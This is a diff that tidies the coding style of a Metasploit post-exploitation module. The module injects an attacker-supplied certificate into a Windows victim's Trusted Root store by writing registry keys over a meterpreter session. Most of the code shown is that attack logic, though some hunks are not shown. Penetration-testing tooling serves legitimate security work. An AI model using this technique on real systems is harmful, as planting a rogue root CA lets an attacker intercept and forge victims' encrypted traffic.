@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,24 +7,23 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Post
-
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Windows Manage Certificate Authority Injection',
-      'Description'   => %q{
-        This module allows the attacker to insert an arbitrary CA certificate
-        into the victim's Trusted Root store.
-      },
-      'License'       => BSD_LICENSE,
-      'Author'        => [ 'vt <nick.freeman[at]security-assessment.com>'],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+                      'Name'          => 'Windows Manage Certificate Authority Injection',
+                      'Description'   => %q(
+                        This module allows the attacker to insert an arbitrary CA certificate
+                        into the victim's Trusted Root store.
+                      ),
+                      'License'       => BSD_LICENSE,
+                      'Author'        => [ 'vt <nick.freeman[at]security-assessment.com>'],
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ]))
 
     register_options(
       [
         OptString.new('CAFILE', [ true, 'Path to the certificate you wish to install as a Trusted Root CA.', ''])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run
@@ -47,17 +47,15 @@ class MetasploitModule < Msf::Post
     loadedcert = OpenSSL::X509::Certificate.new(cert)
     certmd5    = Digest::MD5.hexdigest(loadedcert.to_der).scan(/../)
     certsha1   = Digest::SHA1.hexdigest(loadedcert.to_der).scan(/../)
-    cskiray    = loadedcert.extensions[0].value.gsub(/:/,'').scan(/../)
+    cskiray    = loadedcert.extensions[0].value.delete(':').scan(/../)
 
     derLength = loadedcert.to_der.length.to_s(16)
-    if (derLength.length < 4)
-      derLength = "0#{derLength}"
-    end
+    derLength = "0#{derLength}" if derLength.length < 4
 
     derRay = derLength.scan(/../)
     hexDerLength = [ derRay[1], derRay[0] ]
 
-    certder = loadedcert.to_der.each_byte.collect {|val| "%02X" % val}
+    certder = loadedcert.to_der.each_byte.collect { |val| "%02X" % val }
 
     bblob  = [ "04", "00", "00", "00", "01", "00", "00", "00", "10", "00", "00", "00" ]
     bblob += certmd5
@@ -72,7 +70,7 @@ class MetasploitModule < Msf::Post
 
     blob = bblob.map(&:hex).pack("C*")
 
-    cleancertsha1 = certsha1.to_s.gsub(/[\s\[\\\"\]]/,'').gsub(/,/,'').upcase
+    cleancertsha1 = certsha1.to_s.gsub(/[\s\[\\\"\]]/, '').delete(',').upcase
     catree = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\SystemCertificates\\ROOT\\Certificates"
     entire_key = "#{catree}\\#{cleancertsha1}"
     root_key, base_key = client.sys.registry.splitkey(entire_key)
@@ -84,7 +82,7 @@ class MetasploitModule < Msf::Post
       open_key = nil
       open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ + 0x0000)
       values = open_key.enum_value
-      if (values.length > 0)
+      unless values.empty?
         print_error("Key already exists!")
         return
       end
@@ -97,5 +95,4 @@ class MetasploitModule < Msf::Post
       print_good("CA inserted!")
     end
   end
-
 end
